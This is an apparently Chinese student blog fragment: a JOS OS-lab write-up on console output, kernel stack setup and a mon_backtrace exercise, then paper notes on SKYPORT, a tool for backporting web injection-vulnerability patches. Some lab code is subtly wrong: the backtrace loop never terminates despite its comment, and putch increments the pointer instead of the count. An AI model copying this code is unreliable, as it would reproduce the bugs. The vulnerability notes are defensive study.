class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM1        0x3F8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_TX        0    <span class="hljs-comment">// Out: Transmit buffer (DLAB=0)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_LSR        5    <span class="hljs-comment">// In:    Line Status Register</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_LSR_TXRDY    0x20    <span class="hljs-comment">//   Transmit buffer avail 具体含义/全程</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">serial_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;<br>         !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="hljs-number">12800</span>;<br>         i++)<br>        delay();<br><br>    outb(COM1 + COM_TX, c);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这段代码实际上是控制0x3F8+5 &#x3D; 0x3FD， 0x3F8+0 &#x3D; 0x3F8这两个端口</p><p>通过查询端口功能，可以知道：inb指令是读取0x3fd端口的内容，并且判断它的bit5是否为1，即发送数据缓冲寄存器是否为空。如果为空，则计算机可以发送下一个数据给端口。</p><p>而outb指令则是把要发送的数据c，发送给0x3f8，从上图中可见，当0x3f8端口被写入值时，他是作为发送数据缓冲寄存器的，里面存放要发送给串口的数据。</p><p>lpt_putc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/***** Parallel port output code *****/</span><br><span class="hljs-comment">// For information on PC parallel port programming, see the class References</span><br><span class="hljs-comment">// page.</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">lpt_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; !(inb(<span class="hljs-number">0x378</span>+<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x80</span>) &amp;&amp; i &lt; <span class="hljs-number">12800</span>; i++)<br>        delay();<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">0</span>, c);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>|<span class="hljs-number">0x04</span>|<span class="hljs-number">0x01</span>);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>原理上也是在操作IO端口，经过查询，这段代码用于向PC并行端口发送字符，并通过轮询的方式等待端口准备好接收数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cga_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-comment">// if no attribute given, then use black on white</span><br>    <span class="hljs-keyword">if</span> (!(c &amp; ~<span class="hljs-number">0xFF</span>))<br>        c |= <span class="hljs-number">0x0700</span>;<br><br>    <span class="hljs-keyword">switch</span> (c &amp; <span class="hljs-number">0xff</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\b&#x27;</span>: <span class="hljs-comment">//退格</span><br>        <span class="hljs-keyword">if</span> (crt_pos &gt; <span class="hljs-number">0</span>) &#123;<br>            crt_pos--;<br>            crt_buf[crt_pos] = (c &amp; ~<span class="hljs-number">0xff</span>) | <span class="hljs-string">&#x27; &#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\n&#x27;</span>:  <span class="hljs-comment">//换行</span><br>        crt_pos += CRT_COLS;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\r&#x27;</span>:  <span class="hljs-comment">//回车符，将光标移动到当前行开头</span><br>        crt_pos -= (crt_pos % CRT_COLS);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\t&#x27;</span>:  <span class="hljs-comment">//制表</span><br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:    <span class="hljs-comment">//普通字符</span><br>        crt_buf[crt_pos++] = c;        <span class="hljs-comment">/* write the character */</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// What is the purpose of this?</span><br>    <span class="hljs-keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;   <span class="hljs-comment">//检查是否到达屏幕缓冲区的末尾</span><br>        <span class="hljs-type">int</span> i;       <br><br>        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));                 <span class="hljs-comment">//屏幕内容上滚一行</span><br>        <span class="hljs-keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>            crt_buf[i] = <span class="hljs-number">0x0700</span> | <span class="hljs-string">&#x27; &#x27;</span>; <span class="hljs-comment">//清空最后一行的内容，设置为空格</span><br>        crt_pos -= CRT_COLS;         <span class="hljs-comment">//将光标移动到新一行的开头</span><br>    &#125;<br><br>    <span class="hljs-comment">/* move that little blinky thing */</span><br>    outb(addr_6845, <span class="hljs-number">14</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos &gt;&gt; <span class="hljs-number">8</span>);<br>    outb(addr_6845, <span class="hljs-number">15</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>\lib\printfmt.c：</strong></p><p>这个文件开头有一段注释：</p><p>“打印各种样式的字符串的子程序，经常被printf，sprintf，fprintf函数所调用，这些代码是同时被内核和用户程序所使用的。”所以，这里这个文件中定义的子程序是我们能在编程时直接利用printf函数向屏幕输出信息的关键</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">getuint</span><span class="hljs-params">(va_list *ap, <span class="hljs-type">int</span> lflag)</span><span class="hljs-comment">//？lflag</span><br>&#123;<br>        <span class="hljs-keyword">if</span> (lflag &gt;= <span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">return</span> va_arg(*ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lflag)<br>                <span class="hljs-keyword">return</span> va_arg(*ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>);<br>        <span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">return</span> va_arg(*ap, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>);<br>  <span class="hljs-comment">//能够处理可变个数输入参数的功能就是有va_list, va_arg(), va_start(), va_end()来实现的</span><br>&#125;<span class="hljs-comment">//函数根据lflag参数的值，决定获取的数的大小。</span><br><br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>       num = getuint(&amp;ap, lflag);<br>       base = <span class="hljs-number">16</span>;<br>number:<br>       printnum(putch, putdat, num, base, width, padc);<br>       <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/11/29/OSlab1/image-20231210134724371.png" alt="image-20231210134724371"></p><p>其中定义了一个while循环，分为以下几个步骤：</p><ul><li>首先一个一个的输出格式字符串fmt中所有’%’之前的字符，因为它们就是要直接输出的，比如”This is %d test”中的”This is “。当然如果在把这些字符一个个输出中遇到结束符’\0’，则结束输出。</li><li>剩余的代码都是在处理’%’符号后面的格式化输出，比如是%d，则按照十进制输出对应参数。</li></ul><p>补充8进制格式代码只需要仿照其输出10进制的或者16进制的格式就行</p><p><strong>\kern\printf.c</strong></p><p>这个文件中定义的就是在编程中会用到的最顶层的一些格式化输出子程序，比如printf，sprintf等等。</p><p>这里比较重要的就是我们上边用到了的putch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">putch</span><span class="hljs-params">(<span class="hljs-type">int</span> ch, <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br>    cputchar(ch);<br>    *cnt++;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里这个子程序实现的就是把字符输出到屏幕上，cnt则是计数器，记录的已经输出的字符。</p><h4 id="练习9"><a href="#练习9" class="headerlink" title="练习9"></a>练习9</h4><p><strong>判断一下操作系统内核是从哪条指令开始初始化它的堆栈空间的，以及这个堆栈坐落在内存的哪个地方？内核是如何给它的堆栈保留一块内存空间的？堆栈指针又是指向这块被保留的区域的哪一端的呢？</strong></p><p><strong>从那条指令开始的？</strong></p><p>首先根据之前的分析，boot.S和main.c是PC启动后首先运行的两部分代码，但这两部分并不属于操作系统内核代码。main.c最后跳转到了entry.S，此时控制权被转交给了entry.S。而在这之前，并没有看到一些有关ebp，esp寄存器的操作，所以这会儿并没有初始化堆栈空间。</p><p>entry.S中，有这样三条指令，最后一条指令调用了i386_init，这个子程序位于init.c文件之中。在这个程序中已经开始对操作系统进行一些初始化工作。可见，到i386_init子程序时，内核的堆栈应该已经设置好了。所以前边两句就是初始化操作。</p><p><img src="/2023/11/29/OSlab1/image-20231210135841791.png" alt="image-20231210135841791"></p><p><strong>在内存的什么地方？</strong></p><p>既然要看具体位置，则需要调试，进入entry.S</p><p>所以首先在进入entry.S的位置打断点（b *0x7d63）</p><p><img src="/2023/11/29/OSlab1/image-20231210141109424.png" alt="image-20231210141109424"></p><p>这里可以看到第一条指令是在0x0010000c的位置，这是因为在bootmain中，已经把所有的内核文件加载到0x100000处了，这里可以看到内核的第一条指令所在的物理地址就是0x10000c</p><p>继续运行</p><p><img src="/2023/11/29/OSlab1/image-20231210141331622.png" alt="image-20231210141331622"></p><p>在执行完jmp指令后，地址发生了变化，已经转换成了虚拟地址</p><p><img src="/2023/11/29/OSlab1/image-20231210151728706.png" alt="image-20231210151728706"></p><p>可以看出在栈顶在0xf0117000</p><p>然后在kern&#x2F;entry.S中定义了：</p><p><img src="/2023/11/29/OSlab1/image-20231210152437922.png" alt="image-20231210152437922"></p><p>在inc&#x2F;memlayout.h中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Kernel stack.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KSTACKTOPKERNBASE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KSTKSIZE(8*PGSIZE)   <span class="hljs-comment">// size of a kernel stack</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KSTKGAP(8*PGSIZE)   <span class="hljs-comment">// size of a kernel stack guard</span></span><br></code></pre></td></tr></table></figure><p>在inc&#x2F;mmu.h中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGSIZE4096<span class="hljs-comment">// bytes mapped by a page</span></span><br></code></pre></td></tr></table></figure><p>所以栈的大小就有32KB</p><p><strong>指针是指向这块区域的哪一端的？</strong></p><p>栈是向下生长的，所以指向的是最高处的地址</p><h4 id="练习10"><a href="#练习10" class="headerlink" title="练习10"></a>练习10</h4><p><strong>为了能够更好的了解在x86上的C程序调用过程的细节，我们首先找到在obj&#x2F;kern&#x2F;kern.asm中test_backtrace子程序的地址， 设置断点，并且探讨一下在内核启动后，这个程序被调用时发生了什么。对于这个循环嵌套调用的程序test_backtrace，它一共压入了多少信息到堆栈之中。并且它们都代表什么含义？</strong></p><p>首先看test_backtrace的c语言形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">test_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    cprintf(<span class="hljs-string">&quot;entering test_backtrace %d\n&quot;</span>, x);<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">0</span>)<br>        test_backtrace(x<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">else</span><br>        mon_backtrace(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    cprintf(<span class="hljs-string">&quot;leaving test_backtrace %d\n&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>可见这个子程序是一个循环调用，在每一层循环中先打印信息 “entering test_backtrace x”，然后对test_backtrace进行循环调用。当被循环调用完成，再打印信息 “leaving test_backtrace x”。所以最先进入的程序会最后退出。</p><p>每一次进入test_backtrace后，他会进行如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push %ebp<br>mov %esp, %ebp<br>push %ebx<br>sub $0x14, %esp<br></code></pre></td></tr></table></figure><p>这四个操作将被用于存放调用这个子程序的父程序的栈帧信息，以及为当前子程序分配新的栈帧。</p><p>当运行test_backtrace(5)之前，esp寄存器ebp寄存器的值分别为如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">esp</span>:<span class="hljs-number">0</span>xf010ffe0<br><span class="hljs-attribute">ebp</span>:<span class="hljs-number">0</span>xf010ffd8<br></code></pre></td></tr></table></figure><p>此处的0xf010ffe0-0xf010fff8就是调用test_backtrace的程序i386_init的栈帧</p><p>当调用test_backtrace(5)时，首先call指令会将i386_init的返回地址压入栈中，所以此时esp变成了0xf010ffdc。</p><p>子程序中第一句push %ebp，把i386_init的ebp寄存器的值压入堆栈中，即地址0xf010ffd8处，此时esp的值变为0xf010ffd8。</p><p>然后 mov %esp, %ebp 把ebp的值更新为esp的值，0xf010ffd8。这个就是当前test子程序栈帧的高地址边界。</p><p>然后 push %ebx 把ebx寄存器的值压入堆栈，此时esp变为0xf010ffd4。因为%ebx寄存器可能被这个子程序所使用，所以必须把它之前的值保留。</p><p>然后 sub $0x14, %esp 把esp中的值减去0x14&#x3D;20，esp的值变为0xf010ffc0。这就是给test子程序分配一个大小为20个存储单元的额外的栈帧空间，供它存储一些临时变量的值。</p><p>所以上述4条汇编指令，执行完成后，esp，ebp寄存器的值变化为</p><p>　　　　esp : 0xf010ffc0   ebp：0xf010ffd8  </p><p>这就是test_backtrace(5)子程序运行时的栈帧地址范围。而输入参数’5’的值存放在0xf010ffe0单元处。</p><p>总的来说每次调用test_backtrace时：</p><ol><li>将返回地址（call指令的下一条指令的地址）压栈</li><li>将ebp, esp, ebx三个寄存器的值压栈，以便退出函数前恢复它们的值</li><li>调用cprintf函数打印”entering test_backtrace x”，其中x为输入参数的值</li><li>将输入参数(x-1)压栈</li><li>调用test_backtrace(x-1)</li><li>调用cprintf函数打印”leaving test_backtrace x”，其中x为输入参数的值</li></ol><p><img src="/2023/11/29/OSlab1/image-20231210170111456.png" alt="image-20231210170111456"></p><h4 id="练习11"><a href="#练习11" class="headerlink" title="练习11"></a>练习11</h4><p>实现mon_backtrace，这个函数的功能就是把当前栈里面的所有栈帧按照规定的格式输出出来：</p><p><img src="/2023/11/29/OSlab1/image-20231210204124667.png" alt="image-20231210204124667"></p><p>如何完成：</p><ul><li>ebp指针所指的位置存放的是父函数中我们保存的ebp地址，所以知道了栈顶的ebp的值，就能知道所有的ebp的值，讲义里提到可以使用icn&#x2F;x86.h中的read_ebp()直接获取当前栈顶ebp的值</li><li>ebp+4的位置，存放的是返回地址，也就是eip寄存器的值。再往上就是函数调用时传递的参数</li><li>什么时候停止：在entry.S中，初始化栈帧时，将ebp初始化成了0，所以当ebp为0时就可以终止循环</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br>        <span class="hljs-comment">// Your code here.</span><br>        <span class="hljs-type">uint32_t</span> ebp = read_ebp(); <span class="hljs-comment">//获取当前ebp寄存器中的值，是个地址</span><br>        <span class="hljs-type">uint32_t</span> * temp = (<span class="hljs-type">uint32_t</span> *)ebp; <span class="hljs-comment">//定义指针变量，用于寻址操作</span><br>        cprintf(<span class="hljs-string">&quot;Stack backtrace:\n&quot;</span>); <span class="hljs-comment">//按着格式来</span><br>          <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123; <span class="hljs-comment">//终止条件</span><br>                cprintf(<span class="hljs-string">&quot;  ebp %08x eip %08x args %08x %08x %08x %08x %08x\n&quot;</span>, temp, *(temp+<span class="hljs-number">1</span>), *(temp+<span class="hljs-number">2</span>), *(temp+<span class="hljs-number">3</span>), *(temp+<span class="hljs-number">4</span>), *(temp+<span class="hljs-number">5</span>), *(temp+<span class="hljs-number">6</span>));<span class="hljs-comment">//%08x输出8个字节的16进制数，将temp更新为调用者栈帧的ebp</span><br>                temp = (<span class="hljs-type">uint32_t</span> *)(*temp);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/11/29/OSlab1/image-20231210210244148.png" alt="image-20231210210244148"></p><p><img src="/2023/11/29/OSlab1/image-20231210210220345.png" alt="image-20231210210220345"></p><h3 id="反思与收获"><a href="#反思与收获" class="headerlink" title="反思与收获"></a>反思与收获</h3><p>本次实验使用的是BIOS+MBR的启动方式，但现在多数使用UEFI+GPT（或者说是UEFI+MBR）</p><ul><li>**BIOS:**是一组固化到计算机内主板上一个ROM芯片上的程序，它保存着计算机最重要的基本输入输出的程序、开机后自检程序和系统自启动程序，它可从CMOS中读写系统设置的具体信息。</li><li>**UEFI:**全称“统一的可扩展固件接口”(Unified Extensible Firmware Interface)， 是一种详细描述类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上。</li><li>**MBR:**即主引导记录，是对IBM兼容机的硬盘或者可移动磁盘分区时，在驱动器最前端的一段引导扇区。MBR描述了逻辑分区的信息，包含文件系统以及组织方式。此外，MBR还包含计算机在启动的第二阶段加载操作系统的可执行代码或连接每个分区的引导记录（VBR）。这个MBR代码通常被称为引导程序。</li><li>**GPT:**是GUID磁碟分割表（GUIDPartition Table）的缩写，是一个实体硬盘的分区表的结构布局的标准。它是可扩展固件接口（EFI）标准（被Intel用于替代个人计算机的BIOS）的一部分，被用于替代BIOS系统中的一32bits来存储逻辑块地址和大小信息的主开机纪录（MBR）分区表。</li></ul><p>在启动时：</p><p>MBR里面存放着电脑需要从哪个系统启动的信息，电脑便会自动转到系统所在的分区，继续执行该分区里的引导。<br>对于GPT，电脑会找到硬盘里第一个FAT格式 (比如：FAT32格式) 的主分区，默认该分区为引导所在位置。而且电脑会读取分区里面的固定的引导文件。 但GPT分区表并不是和UEFI强绑定的，并没有规范要求GPT分区表的存储设备必须有第一个分区作为300MB的FAT32格式的EFI分区，GPT分区表的存储设备完全可以是U盘，完全可以没有EFI分区</p><p>GPT相较于MBR：</p><ul><li>MBR最大只支持2TB的硬盘，GPT没有此限制</li><li>MBR最大支持4个主分区，要想分更多分区，需要使用逻辑分区，而windows支持GPT最大128个主分区</li><li>GPT的引导更加透明、可控，并且更强大</li></ul><p>对于内核代码的拉起：</p><p>macOS是直接拉起XNU内核，Linux和Windows一般还需要OS提供的bootloader来拉起操作系统内核</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper3</title>
    <link href="/2023/10/31/ReadPaper3/"/>
    <url>/2023/10/31/ReadPaper3/</url>
    
    <content type="html"><![CDATA[<h2 id="Backporting-Security-Patches-of-Web-Applications-A-Prototype-Design-and-Implementation-on-Injection-Vulnerability-Patches"><a href="#Backporting-Security-Patches-of-Web-Applications-A-Prototype-Design-and-Implementation-on-Injection-Vulnerability-Patches" class="headerlink" title="Backporting Security Patches of Web Applications:A Prototype Design and Implementation on Injection Vulnerability Patches"></a>Backporting Security Patches of Web Applications:A Prototype Design and Implementation on Injection Vulnerability Patches</h2><p>Web应用的反向安全补丁:注入漏洞补丁的原型设计和实现</p><p>由复旦大学和约翰霍普金斯大学研究人员共同研究完成</p><h3 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h3><p>对于修复Web应用程序漏洞，通常的做法是打补丁，但现实世界中补丁的部署存在挑战</p><p>例如：CVE-2018-7600的Drupal补丁发布了三个月，对于这个任意代码执行漏洞，研究人员发现大约有11500个网站没有打补丁。</p><p>原因：</p><p>很多情况下无法将补丁直接应用于易受攻击的网站，因为Web应用程序版本不匹配。具体而言，Web应用程序开发人员在大多数情况下只为最新版本提供补丁，但网站维护者通常因为遗留原因而运行旧版本，例如，该应用程序没有自动更新界面或者网站有一些针对旧版本定制的代码。因此，网站维护者面临的一个实际问题是在旧版本的自己的网站上应用针对最新版本的补丁。根据几项先前的研究，他们通常不愿这样做，因为他们缺乏技术经验，并害怕破坏网站功能。</p><h3 id="Backporting-security-patches安全补丁反向移植"><a href="#Backporting-security-patches安全补丁反向移植" class="headerlink" title="Backporting security patches安全补丁反向移植"></a>Backporting security patches安全补丁反向移植</h3><p>跨版本补丁部署的实际问题可以形式化为一个研究问题，即如何将特定漏洞的给定安全补丁逆向移植到目标旧版本的Web应用程序，简称为安全补丁逆向移植。</p><p>安全补丁逆向移植的一般目标是维护Web应用程序的两个重要属性：</p><p>（1）安全性：即能够抵御与漏洞相关的攻击</p><p>（2）向后兼容性：不引发别的功能问题</p><p><strong>逆向移植的可能性：</strong></p><p>安全补丁的目的是使用安全逻辑来更新Web应用程序中给定输入的脆弱逻辑</p><p>逆向移植是可能的，因为相同的脆弱逻辑也可能存在于目标旧版本的Web应用程序中</p><p>（脆弱逻辑vulnerable logic：应用程序中存在潜在漏洞或者安全问题的部分或代码）</p><p><strong>逆向移植的挑战：</strong></p><ol><li>补丁可能不仅仅更新脆弱逻辑，还可能引入其他新功能，例如添加新输入。这些新功能可能在目标旧版本上无法正常工作，导致兼容性问题。</li><li>目标版本可能不包含与补丁旨在修复的脆弱逻辑完全相同的内容</li></ol><h3 id="SBP（可安全逆向移植补丁）和SBV（可安全逆向移植版本）"><a href="#SBP（可安全逆向移植补丁）和SBV（可安全逆向移植版本）" class="headerlink" title="SBP（可安全逆向移植补丁）和SBV（可安全逆向移植版本）"></a>SBP（可安全逆向移植补丁）和SBV（可安全逆向移植版本）</h3><p>SBP是一种新生成的补丁，只包含从原始补丁中提取的安全的、可确定计算的安全逻辑，用以替换脆弱逻辑；而SBV是一种特殊的目标版本，具有与SBP所针对的脆弱逻辑相同的内容。SBP和SBV的组合实现了安全和向后兼容性的逆向移植目标，因为SBP消除了与漏洞无关的修复，并且SBV确保目标中的脆弱逻辑与原始补丁所针对的脆弱逻辑完全相同。具体而言，我们提出的使用SBP和SBV进行逆向移植是一个三步方法。首先，它确定原始补丁是否可逆向移植，然后从应用了原始补丁的后期版本生成SBP。其次，它检查目标版本并确保该版本是SBV。最后，它确定目标版本中的漏洞位置并应用SBP。</p><h3 id="SKYPORT注入漏洞补丁逆向移植框架"><a href="#SKYPORT注入漏洞补丁逆向移植框架" class="headerlink" title="SKYPORT注入漏洞补丁逆向移植框架"></a>SKYPORT注入漏洞补丁逆向移植框架</h3><p>虽然逆向移植在主观上是有效的，但主要挑战在于如何以正式的可比较的方式表示web应用程序的安全逻辑和脆弱逻辑</p><p>利用sink（危险函数）：可能触发危险行为如文件操作、命令执行、数据库操作等行为的函数</p><p>例如：跨站脚本攻击中的echo</p><p>研究团队观察到，sink函数通常存在与补丁前，补丁后和目标版本，这一结果启发研究团队开发了SKYPORT，这一框架将Web应用程序的安全和脆弱逻辑表示为一种称为“sink能力”（sink capability）的概念</p><p>例子：OpenEMR版本5.0.1之前的CVE2018-10572（任意文件读取漏洞）</p><p>diff：diff是Unix系统的一个很重要的工具程序。它用来比较两个文本文件的差异，是代码版本管理的基石之一。</p><p>官方补丁：</p><p><img src="/2023/10/31/ReadPaper3/image-20231108111205552.png" alt="image-20231108111205552"></p><p>生成的SBP：</p><p><img src="/2023/10/31/ReadPaper3/image-20231108111227472.png" alt="image-20231108111227472"></p><p>部署：</p><p><img src="/2023/10/31/ReadPaper3/image-20231108111307950.png" alt="image-20231108111307950"></p><p><strong>为什么存在漏洞</strong>：</p><p>读取了用户输入$_GET[template]的文件但没有进行任何检查</p><p><strong>为什么逆向移植这个补丁具有挑战性：</strong></p><p>补丁不仅包含修复漏洞的代码（12行），还包含了与漏洞无关的代码（增加的第二行第三行），这可能会引发向后兼容性问题</p><p>同时，将补丁应用到c中所示的目标版本是具有挑战的，因为图a中用于确定补丁位置的第五行没有引入到目标版本</p><p><strong>如何将补丁从5.0.0.6逆向移植到5.0.0.5</strong></p><p>首先，S KY P ORT生成一个可安全逆向移植的补丁SBP，如图b所示，其中包含整个安全逻辑，包括convert_safe_file_dir_name()函数，并删除与漏洞无关的代码。其次，SKYPORT检查版本5.0.0.5是否是一个可安全逆向移植的版本（SBV），因为两个版本的脆弱逻辑，即在图1（a）和（c）中第11行处以sink功能表示的脆弱逻辑，是相同的。最后，S KY P ORT将生成的SBP应用于图1（c）中的SBV，通过添加两行备份代码（第2行和第3行）并将第11行替换为第12行</p><h4 id="Web应用程序的脆弱逻辑表示"><a href="#Web应用程序的脆弱逻辑表示" class="headerlink" title="Web应用程序的脆弱逻辑表示"></a>Web应用程序的脆弱逻辑表示</h4><p>Web应用程序的脆弱逻辑可以表示为与给定用户输入相关的所有控制流和数据流。换句话说，一个经过精心设计的恶意输入可能会引发遵循特定控制流和数据流路径的脆弱程序执行，从而导致恶意后果。</p><p>将导致汇聚点函数的所有控制流路径称为汇聚点流（sink flows），并用 (flow1, flow2, …) 表示</p><p><img src="/2023/10/31/ReadPaper3/image-20231108140242515.png" 